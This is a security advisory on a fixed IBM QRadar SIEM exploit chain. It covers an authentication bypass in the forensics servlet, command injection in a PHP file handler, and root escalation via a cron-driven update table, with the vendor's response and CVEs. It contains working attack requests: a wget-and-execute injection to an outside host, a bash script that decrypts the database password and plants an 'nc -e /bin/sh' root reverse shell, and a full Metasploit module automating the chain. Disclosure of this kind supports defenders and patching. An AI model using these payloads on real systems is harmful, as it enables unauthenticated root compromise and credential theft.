**Vulnerability Summary**<br>
Multiple vulnerabilities in QRadar allow a remote unauthenticated attackers to cause the product to execute arbitrary commands. Each vulnerability on its own is not as strong as their chaining – which allows a user to change from unauthenticated to authenticated access, to running commands, and finally running these commands with root privileges.

**Vendor Response**<br>
“You reported this vulnerability to IBM on January 25th, and we notified you on April 27th that the vulnerability had been fixed. Here is the link to our public notice and the independent researcher that reported it to you was acknowledged: http://www.ibm.com/support/docview.wss?uid=swg22015797. We thank you for your efforts in reporting these issues to us, and for delaying your disclosures until IBM published a fix.

For your awareness the third vulnerability you reported with regards to privilege escalation to root had been fixed in patches a few weeks prior to the initial report. This is the bulletin for that particular CVE: http://www.ibm.com/support/docview.wss?uid=swg22012293.

After concerns regarding the scoring of the other vulnerabilities were brought to our attention, the scoring has been reviewed and some corrections made. The reported issue has been separated into separate CVEs: a new one for the authentication bypass CVE-2018-1612; and the existing one for the command injection as an unprivileged user CVE-2018-1418. The updated descriptions and scoring for these CVEs is as follows:

CVE-2018-1612 IBM QRadar Incident Forensics could allow a remote attacker to bypass authentication and obtain sensitive information

CVSS Base: 5.8<br>
CVE-2018-1418 IBM QRadar Incident Forensics could allow an authenticated attacker to execute commands as ‘nobody’.

CVSS Base: 7.4<br>
CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L

The issue in the initial scoring occurred due to a miscommunication in our process and we are working to improve our process going forward. We apologize for the problematic scoring in our initial disclosure. Also while the fix for the authentication CVE-2018-1612 was included in 7.2.8 Patch 11 we discovered an issue with 7.3.1 Patch 2 and are issuing an iFix as outlined here www.ibm.com/support/docview.wss?uid=swg22017062. The command injection issue is fixed in 7.3.1 Patch 2 as previously published.”

**CVE**<br>
CVE-2018-1418

(NOTE while only a single CVE was issued three vulnerabilities were patched by the vendor)

**Credit**<br>
An independent security researcher, Pedro Ribeiro, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Vulnerability Details**<br>
QRadar has a built-in application to perform forensic analysis on certain files. This is disabled in the free Community Edition, but the code is still there, and part of it still works. This application has two components, one servlet running in Java, and the main web application running PHP. This exploit chain abuses both components of the forensics application to bypass authentication and write a file to disk, and then it abuses a cron job to escalate privileges to root.
QRadar has an Apache reverse proxy sitting in front of all its web applications, which routes requests according to the URL. Requests sent to /console/* get routed to the main “console” application, which not only runs the web interface but also performs the main functions of QRadar. Then there are several helper applications, such as the forensics application described above, which can be reached at /forensics and /ForensicAnalysisServlet, the SOLR server, reachable at /solr and others.

**Technical details**<br>
Vulnerability: Authentication Bypass (in ForensicAnalysisServlet)<br>
Attack Vector: Remote<br>
Constraints: None<br>
Affected products / versions:<br>
– IBM QRadar SIEM: 7.3.0 and 7.3.1 confirmed; possibly all versions released since mid-2014 are affected<br>
QRadar authentication is done via a SEC cookie, which is a session UUID. This is managed centrally by a session manager which runs in the main QRadar console application. The SEC cookies can be obtained in three ways:

– Upon login in the main console application<br>
– Using a previously created authorisation token (also created in the console)<br>
– From the /etc/qradar/conf/host.token file, which contains a UUID generated at install time, used by internal services to perform administrative actions.<br>

The ForensicAnalysisServlet stores the SEC cookie in a HashMap, and then checks if the cookie is valid with the console application before committing any action… except for one specific codepath.
The function doGetOrPost() processes all requests to ForensicsAnalysisServlet. This function does a number of actions, such as fetching a results file, checking the status of an analysis request, etc. In order to authenticate, the requester has to have its SEC and QRadarCSRF tokens registered with the servlet. This is done by application with the setSecurityTokens action, with which a requester specifies both tokens and registers them with the servlet. In order to perform authentication for the setSecurityTokens action, the servlet checks if the host.token SEC cookie was sent with the request.

However, if the forensicsManagedHostIps parameter is sent with the setSecurityTokens action, doGetOrPost() will pass on the request to doPassThrough() before authenticating it.
doPassThrough() also validates if the request contains a valid SEC cookie… at some point. The problem is that if we send the setSecurityTokens action, in the beginning of the function the SEC and QRadarCSRF values are added to the servlet HashMap of valid tokens… before being validated.
From reverse engineering the code, it is clear that an unauthenticated user can insert arbitrary SEC and QRadarCSRF values into the servlet cookie HashMaps.
To show this in action, let’s try to do a request to the servlet, and we get a 403 error:
Request:

`GET /ForensicsAnalysisServlet/?action=someaction HTTP/1.1`<br>
`Cookie: SEC=owned; QRadarCSRF=superowned;``

Response:<br>
`HTTP/1.1 403 Forbidden`

Now we send our request to add the SEC and QRadarCSRF values to the valid token lists. By sending the following request, the values “owned” and “superowned” are added to the valid SEC and QRadarCSRF tokens:
`POST /ForensicsAnalysisServlet/?action=setSecurityTokens&forensicsManagedHostIps=something HTTP/1.1`<br>
`Cookie: SEC=owned; QRadarCSRF=superowned;`<br>
`Content-Type: application/json`<br>
`Content-Length: 44`<br>
`something1002,something1003,owned,superowned`<br>

To which the server will respond:

`HTTP/1.1 200 OK`<br>
`{"exceptionMessageValue":"javax.servlet.ServletException: No valid forensics analysis host token data found."}`<br>

And now our cookies have been added to the SECCookiesMap and QradarCSRFCookiesMap, so we can invoke all actions (even the ones that required authenticated cookies) in ForensicsAnalysisServlet.<br>
So let’s try to repeat the initial request, for which we got a 403:
`GET /ForensicsAnalysisServlet/?action=someaction HTTP/1.1`<br>
`Cookie: SEC=owned; QRadarCSRF=superowned;`<br>

Response:

`HTTP/1.1 200 OK`<br>
`{"exceptionMessageValue":"javax.servlet.ServletException: No valid forensics analysis solrDocIds parameter found."}`<br>

Success! We’ve bypassed authentication.<br>
Vulnerability: Command Injection (in PHP web application)<br>
Attack Vector: Remote<br>
Constraints: Authentication needed (can be bypassed with vulnerability #1)<br>
Affected products / versions:<br>
– IBM QRadar SIEM: 7.3.0 and 7.3.1 confirmed; possibly all versions released since mid-2014 are affected<br>

The second vulnerability in this exploit chain is in the PHP part of the forensics web application. Using vulnerability #1 to add our SEC and QRadarCSRF cookies to the ForensicAnalysisServlet HashMaps means that we can invoke any function in the Java part of the application, but the PHP part uses a separate authentication scheme which doesn’t have a similar flaw. However, it accepts any requests coming from localhost without needing authentication. Authentication is done in the PHP part by including the DejaVu/qradar_helper.php file, which invokes the LoginCurrentUser function:<br>

```
1046     public function LoginCurrentUser ($remember, &$errorInfo)
1047     {
1048                 //if local server request don't need to login the user
1049         if($_SERVER['REMOTE_ADDR'] == $_SERVER['SERVER_ADDR'])
1050         {
1051                 return true;
1052         }
1053
```

Note that not having authentication for local requests is not necessarily a vulnerability, although it is a bad practice as it can lead to situations like we are going to describe.

So how can we make requests seem like they come from localhost? Something as simple as changing the Host HTTP header will not work. Luckily, we can leverage ForensicAnalysisServlet doPassThrough() again. After the snippet shown in vulnerability #1, the function goes on to forward the request to the host address(es) entered in the forensicsManagedHostIps parameter.
From reverse engineering the code its clear that if we send 127.0.0.1 in the forensicsManagedHostIps parameter, we can make ForensicAnalysisServlet forward our request to the PHP web application and bypass authentication. So now how to exploit this? In the PHP we application, we have file.php, which has a “get” functionality that allows an authenticated user to fetch certain files off the filesystem. file.php forwards the request to DejaVu/FileActions.php, which does some checks to ensure that the file is in a restricted set of directories:

```
42     public static function Get()
 43     {
 44         global $TEMP_DIR, $PRODUCT_NAME, $QRADAR_PRE_URL_PATH;
 45                 $pcapArray = array_key_exists ( 'pcap', $_REQUEST ) ? $_REQUEST ['pcap'] : '';
 46                 $acceptablePaths = array("/store/forensics/case_input","/store/forensics/case_input_staging", "/store/forensics/tmp");
 47         $docid = array_key_exists('docid', $_GET) ? $_GET['docid'] : '';
 48         $guitype = array_key_exists('gui', $_GET) ? htmlspecialchars($_GET['gui'], ENT_QUOTES) : 'standard';
 49         $path = array_key_exists('path', $_GET) ? $_GET['path'] : '';
 50         if (!empty($path))
 51         {
 52                 $path = urldecode($path);
 53                 $path = FileActions::validate_path($path, $acceptablePaths);
 54                 if(empty($path))
 55                 {
 56                         QRadarLogger::logQradarError("FileActions.Get(): operation failed");
 57                         return;
 58                 }
 59         }
...
 98         if (!empty($docid)) {
 99             $doc = IndexQuery::GetDocument($docid, $guitype);
100             if ($doc) {
101                 $savedFile = new SavedFile($doc);
102                 if ($savedFile->hasFile()) {
103                     if ($savedFile->isLocal())
104                         $savedFile->sendFile($guitype);
105                     else
106                         $savedFile->doProxy();
107                 } else
108                     send404();
109             } else
110                 send404();
111
112         } else if (!empty($path)) {
113             if (file_exists($path)) {
114                 if (!SavedFile::VetFile($path, $guitype))
115                     return;
116                 readfile($path);
117             } else
118                 send404();
119
```

The codepath that we are interested to hit is the pcapArray if, shown below. If we send a PHP array with several pcap parameters, the web application will ZIP these files before sending:

```
120
121         } else if (is_array($pcapArray)) {
122             $hostname = array_key_exists('hostname', $_REQUEST) ? $_REQUEST['hostname'] : $_SERVER['SERVER_ADDR'];
123             if (count($pcapArray) > 1) {
124                 $basename = uniqid() . ".zip";
125                 $zip_filename = $TEMP_DIR . "/" . $basename;
126             } else {
127                 $zip_filename = $pcapArray[0]['pcap'];
128                 $basename = basename($zip_filename);
129
130             }
131
...
149
150             for($i = 0, $j = count($pcapArray); $i < $j ; $i++) {
151                 $pcapFileList[] = $pcapArray[$i]['pcap'];
152             }
153
154             if (count($pcapArray) > 1) {
155                 // More than one pcap, so zip up the files and send the zip
156                 $fileList = implode(' ', $pcapFileList);
157                 //error_log("filename >> ".$filename);
158                 //error_log( print_r($fileList,TRUE) );
```

Which clearly leads to a command injection right here, using the pcap filenames:

```
159                 $cmd = "/usr/bin/zip -qj $zip_filename $fileList 2>&1";
160                 //error_log("\$cmd =".$cmd);
161
162                 $result = exec($cmd, $cmd_output, $cmd_retval);
```

Bingo! It allows us to execute code as the httpd web server user, which is the unprivileged “nobody” user. For example, to download and execute a shell from 172.28.128.1, we can send the following GET request, provided we have used vulnerability #1 to create valid SEC and QRadarCSRF cookies:

`GET /ForensicsAnalysisServlet/?forensicsManagedHostIps=127.0.0.1/forensics/file.php%3f%26&action=get&slavefile=true&pcap[0][pcap]=/rand/file&pcap[1][pcap]=$(mkdir -p /store/configservices/staging/updates && wget -O /store/configservices/staging/updates/runme http://172.28.128.1:4444/runme.sh && /bin/bash /store/configservices/staging/updates/runme)& HTTP/1.1`<br>
`Cookie: SEC=owned; QRadarCSRF=superowned;`<br>

This will take a few seconds to process, but eventually our shell gets downloaded, and we get the following response:

`HTTP/1.1 200 OK`
`{"exceptionMessageValue":"javax.servlet.ServletException: No valid forensics analysis forensicsManagedHostIps parameter found."}`

The pcap[1][pcap] parameter is shown unencoded to facilitate reading, but the actual exploit should have this parameter fully URL encoded. As you can see, we can use the forensicsManagedHostIps not only to pick the host address but also to inject the URL path that will be used.

Care needs to be taken when choosing a directory to download the file to. The “nobody” user cannot write to /tmp, but a good choice is /store/configservices/*, which is used for various tasks, and is writeable by “nobody”. The /store/configservices/staging/updates/ was chosen (and created) because it plays a central role in our upcoming root privilege escalation exploit.

Vulnerability: Privilege Escalation (“nobody” user to root)<br>
Attack Vector: Local<br>
Constraints: “nobody” user shell needed (can be obtained with vulnerability #2)
Affected products / versions:<br>
– IBM QRadar SIEM: 7.3.0 and 7.3.1 confirmed; possibly all versions released since mid-2014 are affected<br>
The final step to totally owning QRadar is to escalate privileges from our limited “nobody” user to root.<br>
For this we can leverage the following cron job, which runs as root every minute:

```
# Check if autoupdate should be run
* * * * * /opt/qradar/bin/UpdateConfs.pl  > /dev/null 2>&1
```

The code is convoluted, so it won’t be shown here for brevity. However, this Perl script invokes checkRpm(), which then calls checkRpmStatus(). The latter will fetch the autoupdate_patch database table and check if there are any entries left to process. If the file entry name ends with .rpm, it will invoke processRpm(), which installs it, otherwise it will invoke installMinor(), which will run “sh +x” on the file entry. These file entries are expected to be in the “update_download_dir” directory, which can be fetched with psql -U qradar -c “select value from autoupdate_conf where key = ‘update_download_dir'”, but it is /store/configservices/staging/updates/ by default. As explained in vulnerability #2, /store/configservices/* is writeable by “nobody”, so we can dump any files we want there, create directories, etc.

Luckily, the “nobody” user can access the database – after all, the Java and PHP server processes need to access it, and they run as “nobody”. Because the /tmp directory cannot be accessed by the “nobody” user, we cannot rely on password-less local socket connection to the database; so we have to use TCP/IP, which means we need the database password. The password is in /opt/qradar/conf/config_user.xml (readable by “nobody”) and it is stored encrypted, but can be decrypted using the code of a built-in shell script.
So once we have the database password, all we need to do is to add an entry to that table to a script we control (for example /store/configservices/staging/updates/owned.sh), and within one minute it will be run as root:

`PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c "insert into autoupdate_patch values ('owned.sh',558,'minor',false,1337,0,'',1,false,'','','',false)"`

The exploit script that does this privilege escalation and returns a root reverse shell to 172.28.128.1:4445 is shown as Appendix A. This file can be written using a combination of vulnerabilities #1 and #2 to complete the full exploit chain, allowing an unauthenticated user to achieve root code execution remotely.

**Appendix A**<br>
```bash
#!/bin/bash
# our reverse shell that will be executed as root
cat <<EOF > /store/configservices/staging/updates/superowned
#!/bin/sh
nc -e /bin/sh 172.28.128.1 4445
EOF
### below is adapted from /opt/qradar/support/changePasswd.sh
[ -z $NVA_CONF ] && NVA_CONF="/opt/qradar/conf/nva.conf"
NVACONF=`grep "^NVACONF=" $NVA_CONF 2> /dev/null | cut -d= -f2`
FRAMEWORKS_PROPERTIES_FILE="frameworks.properties"
FORENSICS_USER_FILE="config_user.xml"
FORENSICS_USER_FILE_CONFIG="$NVACONF/$FORENSICS_USER_FILE"
# get the encrypted db password from the config
PASSWORDENCRYPTED=`cat $FORENSICS_USER_FILE_CONFIG | grep WEBUSER_DB_PASSWORD | grep -o -P '(?<=>)([\w\=]*)(?=<)'`
QVERSION=$(/opt/qradar/bin/myver | awk -F. '{print $1$2$3}')
AU_CRYPT=/opt/qradar/lib/Q1/auCrypto.pm
P_ENC=$(grep I_P_ENC ${AU_CRYPT} | cut -d= -f2-)
P_DEC=$(grep I_P_DEC ${AU_CRYPT} | cut -d= -f2-)
#if 7.2.8 or greater, use new method for hashing and salting passwords
if [ $QVERSION -gt 727 ]
then
    PASSWORD=$(perl <(echo ${P_DEC} | base64 -d) <(echo ${PASSWORDENCRYPTED}))
			[ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
else
		AESKEY=`grep 'aes.key=' $NVACONF/$FRAMEWORKS_PROPERTIES_FILE | cut -c9-`
    PASSWORD=`/opt/qradar/bin/runjava.sh -Daes.key=$AESKEY com.q1labs.frameworks.crypto.AESUtil decrypt $PASSWORDENCRYPTED`
		[ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
fi
PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c "insert into autoupdate_patch values ('superowned',558,'minor',false,1337,0,'',1,false,'','','',false)"
# delete ourselves
(sleep 2 && rm -- "$0") &
```

**Exploit**<br>
```rb
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
require 'securerandom'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IBM QRadar SIEM Unauthenticated Remote Code Execution',
      'Description'    => %q{
        IBM QRadar SIEM has three vulnerabilities in the Forensics web application
        that when chained together allow an attacker to achieve unauthenticated remote code execution.
        The first stage bypasses authentication by fixating session cookies.
        The second stage uses those authenticated sessions cookies to write a file to disk and execute
        that file as the "nobody" user.
        The third and final stage occurs when the file executed as "nobody" writes an entry into the
        database that causes QRadar to execute a shell script controlled by the attacker as root within
        the next minute.
        Details about these vulnerabilities can be found in the advisories listed in References.
        The Forensics web application is disabled in QRadar Community Edition, but the code still works,
        so these vulnerabilities can be exploited in all flavours of QRadar.
        This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. Most likely all versions released since
        mid 2014 are vulnerable, as that was when the Forensics application was introduced.
        Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'References'     =>
        [
         ['CVE', ''],
         ['URL', 'SECURITEAM_URL'],
         ['URL', 'GITHUB_URL'],
         ['URL', 'FULLDISC_URL']
        ],
      'Targets'        =>
        [
          [ 'IBM QRadar SIEM <= LAST_VULN_VERSION', {} ],
        ],
      'Payload'        => {
        'Compat'       => {
          'ConnectionType'  => 'reverse',
        }
      },
      'DefaultOptions'  => {
        'SSL'     => true,
        # we can only run shell scripts, so set a reverse netcat payload by default
        # the payload that will be run is in the first few lines of @payload
        'PAYLOAD' => 'generic/shell_reverse_tcp',
      },
      'DisclosureDate'  => 'TBD',
      'DefaultTarget'   => 0))
    register_options(
      [
        Opt::RPORT(443),
        OptString.new('SRVHOST', [true, 'HTTP server address', '0.0.0.0']),
        OptString.new('SRVPORT', [true, 'HTTP server port', '4448']),
      ], self.class)
  end
  def check
    begin
      res = send_request_cgi({
        'uri'       => '/ForensicsAnalysisServlet/',
        'method'    => 'GET',
      })
      if res && res.code == 403
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
    Exploit::CheckCode::Safe
  end
  # Handle incoming requests from QRadar
  def on_request_uri(cli, request)
    print_good("#{peer} - Sending privilege escalation payload to QRadar...")
    print_good("#{peer} - Sit back and relax, Shelly will come visit soon!")
    send_response(cli, @payload)
  end
  # step 1 of the exploit, bypass authentication in the ForensicAnalysisServlet
  def set_cookies
    @sec_cookie = SecureRandom.uuid
    @csrf_cookie = SecureRandom.uuid
    post_data = "#{rand_text_alpha(rand(12)+5)},#{rand_text_alpha(rand(12)+5)}," +
      "#{@sec_cookie},#{@csrf_cookie}"
    res = send_request_cgi({
      'uri'       => '/ForensicsAnalysisServlet/',
      'method'    => 'POST',
      'ctype'     => 'application/json',
      'cookie'    => "SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};",
      'vars_get'  =>
      {
        'action'  => 'setSecurityTokens',
        'forensicsManagedHostIps' => "#{rand(256)}.#{rand(256)}.#{rand(256)}.#{rand(256)}"
      },
      'data'      => post_data
    })
    if res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Failed to set the SEC and QRadar CSRF cookies")
    end
  end
  def exploit
    print_status("#{peer} - Attempting to exploit #{target.name}")
    # run step 1
    set_cookies
    # let's prepare step 2 (payload) and 3 (payload exec as root)
    @payload_name = rand_text_alpha_lower(3+rand(5))
    root_payload = rand_text_alpha_lower(3+rand(5))
    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end
    http_service = (datastore['SSL'] ? 'https://' : 'http://') + srv_host + ':' + datastore['SRVPORT'].to_s
    service_uri = http_service + '/' + @payload_name
    print_status("#{peer} - Starting up our web service on #{http_service} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => "/#{@payload_name}"
    }})
    @payload = %{#!/bin/bash
# our payload that's going to be downloaded from our web server
cat <<EOF > /store/configservices/staging/updates/#{root_payload}
#!/bin/bash
/usr/bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &
EOF
### below is adapted from /opt/qradar/support/changePasswd.sh
[ -z $NVA_CONF ] && NVA_CONF="/opt/qradar/conf/nva.conf"
NVACONF=`grep "^NVACONF=" $NVA_CONF 2> /dev/null | cut -d= -f2`
FRAMEWORKS_PROPERTIES_FILE="frameworks.properties"
FORENSICS_USER_FILE="config_user.xml"
FORENSICS_USER_FILE_CONFIG="$NVACONF/$FORENSICS_USER_FILE"
# get the encrypted db password from the config
PASSWORDENCRYPTED=`cat $FORENSICS_USER_FILE_CONFIG | grep WEBUSER_DB_PASSWORD | grep -o -P '(?<=>)([\\w\\=]*)(?=<)'`
QVERSION=$(/opt/qradar/bin/myver | awk -F. '{print $1$2$3}')
AU_CRYPT=/opt/qradar/lib/Q1/auCrypto.pm
P_ENC=$(grep I_P_ENC ${AU_CRYPT} | cut -d= -f2-)
P_DEC=$(grep I_P_DEC ${AU_CRYPT} | cut -d= -f2-)
#if 7.2.8 or greater, use new method for hashing and salting passwords
if [ $QVERSION -gt 727 ]
then
    PASSWORD=$(perl <(echo ${P_DEC} | base64 -d) <(echo ${PASSWORDENCRYPTED}))
      [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
else
    AESKEY=`grep 'aes.key=' $NVACONF/$FRAMEWORKS_PROPERTIES_FILE | cut -c9-`
    PASSWORD=`/opt/qradar/bin/runjava.sh -Daes.key=$AESKEY com.q1labs.frameworks.crypto.AESUtil decrypt $PASSWORDENCRYPTED`
    [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
fi
PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c \
"insert into autoupdate_patch values ('#{root_payload}',#{rand(1000)+100},'minor',false,#{rand(9999)+100},0,'',1,false,'','','',false)"
# kill ourselves!
(sleep 2 && rm -- "$0") &
}
    # let's do step 2 then, ask QRadar to download and execute our payload
    print_status("#{peer} - Asking QRadar to download and execute #{service_uri}")
    exec_cmd = "$(mkdir -p /store/configservices/staging/updates && wget --no-check-certificate -O " +
      "/store/configservices/staging/updates/#{@payload_name} #{service_uri} && " +
      "/bin/bash /store/configservices/staging/updates/#{@payload_name})"
    payload_step2 = "pcap[0][pcap]" +
      "=/#{rand_text_alpha_lower(rand(6) + 2) + '/' + rand_text_alpha_lower(rand(6) + 2)}" +
      "&pcap[1][pcap]=#{Rex::Text::uri_encode(exec_cmd, 'hex-all')}"
    uri_step2 = "/ForensicsAnalysisServlet/?forensicsManagedHostIps" +
      "=127.0.0.1/forensics/file.php%3f%26&action=get&slavefile=true"
    res = send_request_cgi({
        'uri'       => uri_step2 + '&' + payload_step2,
        'method'    => 'GET',
        'cookie'    => "SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};",
      })
  # now we just sit back and wait for step 2 payload to be downloaded and executed
  # ... and then step 3 to complete. Let's give it a little more than a minute.
  sleep 80
  end
end
```
